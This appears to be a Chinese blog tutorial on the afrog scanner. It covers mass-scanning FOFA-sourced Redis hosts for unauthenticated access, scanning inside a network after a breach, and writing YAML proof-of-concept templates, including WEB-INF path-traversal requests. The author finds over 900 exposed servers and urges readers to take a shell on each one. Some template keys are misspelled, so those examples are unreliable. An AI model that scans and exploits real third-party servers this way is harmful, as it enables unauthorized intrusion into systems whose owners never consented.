## 实战-进阶篇

这里举4个例子，耐心看完，无论对你日常渗透还是护网打比赛，都有帮助。

# 一、fofa 针对某个漏洞批量操作

适用于刷src排名，拿证书，某个漏洞深入利用。

比如redis未授权漏洞，可以直接拿shell。

①先利用fofa 导出1w条资产

    
    
    查询条件：port="6379" && protocol="redis"
    

![1669273036_637f15ccc34bfa24c0706.png!small?1669273037048](https://image.3001.net/images/20221124/1669273036_637f15ccc34bfa24c0706.png!small?1669273037048)

![1669273048_637f15d8491142e8300c9.png!small?1669273048811](https://image.3001.net/images/20221124/1669273048_637f15d8491142e8300c9.png!small?1669273048811)

② *改线程，（资产量大，且只针对一个漏洞时）

    
    
    C:\Users\yangjian\.config\afrog    #配置文件
    

![1669273088_637f1600aae368852fb07.png!small?1669273088809](https://image.3001.net/images/20221124/1669273088_637f1600aae368852fb07.png!small?1669273088809)

③再用afrog 批量操作

    
    
    afrog -T redis.txt      #ip 一行一个
    

最终结果，真实存在redis未授权漏洞的有900多个

![1669273107_637f1613bc1c81ad33771.png!small?1669273107878](https://image.3001.net/images/20221124/1669273107_637f1613bc1c81ad33771.png!small?1669273107878)

然后你就可以挨个拿shell啦

再进一步利用的，可以去各大平台 提交漏洞刷排名，拿证书拿到手软。

## 二、端口

此处是我最喜欢的，最常用的。

*这里说下工具的构造思想，是自动识别http或s的，甚至加不加http都是可以的，也就是一个ip或域名都可以。并且url最后面的/，加不加也无所谓，也是自动识别的。

①获取资产 端口 （适合批量资产，外wei打点，注意只针对web服务哦~）

②带端口的txt （一行一个小朋友）

③开扫~捡洞!

![1669273507_637f17a3ab24f00db78db.png!small?1669273507881](https://image.3001.net/images/20221124/1669273507_637f17a3ab24f00db78db.png!small?1669273507881)

![1669273524_637f17b410c663131ebf8.png!small](https://image.3001.net/images/20221124/1669273524_637f17b410c663131ebf8.png!small)

  

![1669273534_637f17be41a44bcc8dae6.png!small](https://image.3001.net/images/20221124/1669273534_637f17be41a44bcc8dae6.png!small)

  

## 三、内网

有些鸡肋（已进入内网）

适用于本地提权失败，可以借此拿下更多web服务器，以扩展攻击面。

①先内网信息收集一波，存活ip，端口，服务啥的

②跟上面一样，把web服务的都弄到txt里，一行一个小朋友

③不用我说了吧 捡洞吧

![1669273641_637f1829236468905680b.png!small?1669273641150](https://image.3001.net/images/20221124/1669273641_637f1829236468905680b.png!small?1669273641150)

![1669273666_637f18424173986f01d85.png!small?1669273666438](https://image.3001.net/images/20221124/1669273666_637f18424173986f01d85.png!small?1669273666438)

![1669273683_637f185320aa83e65270f.png!small?1669273682946](https://image.3001.net/images/20221124/1669273683_637f185320aa83e65270f.png!small?1669273682946)

  

## 四、编写POC

定制自己的poc是afrog的灵魂所在，如果你有0day或1day漏洞，只需爬取所需的资产，-P指定0day的poc，无论hvv还是打比赛你将无往不胜。

POC，全称 Proof of Concept 指验证漏洞的一段代码。

###
**POC是用[YAML](https://so.csdn.net/so/search?q=YAML&spm=1001.2101.3001.7020
"YAML")语言编写的，YAML是什么，自行百度。**

    
    
    id: CVE-2022-22947
    info:
      name: Spring Cloud Gateway Code Injection
      author: alex
      severity: critical
      description: |
        Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud Gateway...
        影响版本：Spring Cloud Gateway 3.1.x < 3.1.1 、Spring Cloud Gateway < 3.0.7
        官方已发布安全版本，请及时下载更新，下载地址：https://github.com/spring-cloud/spring-cloud-gateway
        FOFA：app="vmware-SpringBoot-framework"
      reference:
        - https://mp.weixin.qq.com/s/qIAcycsO_L9JKisG5Bgg_w  // 必须是列表（数组）形式

格式是固定的，接下来一一介绍各模块的功能。

  

  

id：

|

zhiyuan-oa-unauth公司-产品-漏洞名称或 CVE-2022-0202  
  
---|---  
  
name：

|

漏洞名称，尽量英文且官方用语  
  
author：

|

作者 大名  
  
severity:

|

漏洞等级，分为critical、high、mideum、low、info，请参考 [National Vulnerability Database]  
  
description:(可选填)

|

包含漏洞描述、漏洞影响、网络测绘、修复建议等  
  
reference:(可选填)

|

参考链接，必须数组形式，否则 poc 无法验证  
  
  

    
    
    rules:
      r0:
        request:
          method: GET
          path: /phpinfo.php
        exppression: response.status == 200 && response.body.bcontains(b'PHP Version')
        stop_if_match: true
      r1:
        before_sleep: 6
        request:
          method: GET
          path: /info.php
        expresssion: response.status == 200 && response.body.bcontains(b'PHP Version')
        stop_if_mismatch: true
    expression: r0() || r1()

  

rules：

|

定义规则组  
  
---|---  
  
r0 / r1 :

|

子规则，自定义名称，不能重复  
  
request:

|

表示 http request 请求  
  
method:

|

表示 http request method 方法  
  
path:

|

表示 http request URL 请求的 PATH  
  
expresssion：

|

子规则的验证表达式，用于验证 r0 或 r1 是否匹配规则。比如：response.status == 200 &&
response.body.bcontains(b'PHP Version')表示 request 请求返回状态码必须是 200 且 源码必须含有PHP
Version关键字  
  
stop_if_match:

|

如果匹配就停止  
  
stop_if_mismatch：

|

如果不匹配就停止  
  
before_sleep:

|

顾名思义，http 请求前 sleep 6 秒钟  
  
expression:

|

最外面的expression是rules的验证表达式，r0() || r1()表示r0和r1两个规则，匹配一个表达式就为true，代表漏洞存在。  
  
 **注意：如果 rules 表达式都是`||`关系，比如：r0() || r1() || r2() … ，默认执行
`stop_if_match`动作。同理，如果表达式都是 `&&`关系，默认执行 `stop_if_mismatch`动作。**

  

    
    
    set:
      hostname: request.url.host
    rules:
      r0:
        request:
          raw: |    //raw 顾名思义  支持原生 http 请求
            GET .//WEB-INF/web.xml HTTP/1.1
            Host: {{hostname}}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') && (response.raw_header.bcontains(b'application/xml') || response.raw_header.bcontains(b'text/xml'))
      r1:
        request:
          raw: |
            GET .//WEB-INF/weblogic.xml HTTP/1.1
            Host: {{hostname}}
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        expression: response.status == 200 && response.body.bcontains(b'<weblogic-web-app') && response.body.bcontains(b'</weblogic-web-app>') && (response.raw_header.bcontains(b'application/xml') || response.raw_header.bcontains(b'text/xml'))
    expression: r0() || r1()

``

``

`//raw 顾名思义 支持原生 http 请求`

``

  

## 总结：

afrog是一个扩展性很好的工具，并且速度和准确率达到了完美平衡。

  

  

  

